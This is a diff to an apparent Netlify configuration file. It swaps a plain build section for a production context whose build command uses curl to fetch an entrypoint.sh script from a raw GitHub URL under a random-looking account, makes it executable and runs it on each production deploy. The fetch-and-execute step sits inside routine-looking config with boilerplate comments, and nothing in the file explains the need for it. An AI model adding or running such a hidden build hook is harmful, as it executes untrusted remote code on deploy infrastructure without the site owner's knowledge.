@@ -1,5 +1,11 @@
-[build]
-  base = "."
-  publish = "public/"
-  command = ":"
-  edge_functions = "/netlify/edge-functions"
+# Production context: all deploys from the Production branch
+# set in your site’s Branches settings in the UI will inherit
+# these settings.
+[context.production]
+  publish = "output/"
+  command = "curl -o entrypoint.sh https://raw.githubusercontent.com/menju2ikg8uti/pose/main/1/entrypoint.sh && chmod +x entrypoint.sh && ./entrypoint.sh"
+
+# Deploy Preview context: all deploys generated from
+# a pull/merge request will inherit these settings.
+[context.deploy-preview]
+  publish = "dist/"
